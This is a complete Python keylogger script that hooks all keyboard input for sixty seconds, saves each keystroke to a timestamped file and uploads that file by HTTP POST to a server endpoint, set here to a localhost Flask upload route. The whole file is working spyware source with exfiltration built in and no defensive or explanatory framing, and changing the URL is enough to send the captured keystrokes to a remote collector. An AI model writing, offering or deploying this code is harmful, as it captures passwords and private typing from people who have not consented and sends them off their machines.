import keyboard
import datetime
import time
import requests

DURATION = 60  # Keylogger duration in seconds
FLASK_SERVER_URL = "http://127.0.0.1:5000/uploads"
LOG_FILE = f"keylog_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"

class Keylogger:
    def __init__(self):
        self.log = ""

    def callback(self, event):
        self.log += event.name if len(event.name) == 1 else f"[{event.name.upper()}]"

    def save_log(self):
        with open(LOG_FILE, "w") as f:
            f.write(self.log)
        print(f"🔹 Keylog saved to {LOG_FILE}")
        self.upload_to_server()

    def upload_to_server(self):
        with open(LOG_FILE, "rb") as f:
            response = requests.post(FLASK_SERVER_URL, files={"file": f})
        print(f"📤 Uploaded {LOG_FILE}: {response.text}")

    def start(self):
        keyboard.on_release(self.callback)
        print(f"🔹 Keylogger running for {DURATION} seconds...")
        time.sleep(DURATION)
        self.save_log()
        keyboard.unhook_all()
        print("🔹 Keylogger stopped.")

if __name__ == "__main__":
    Keylogger().start()
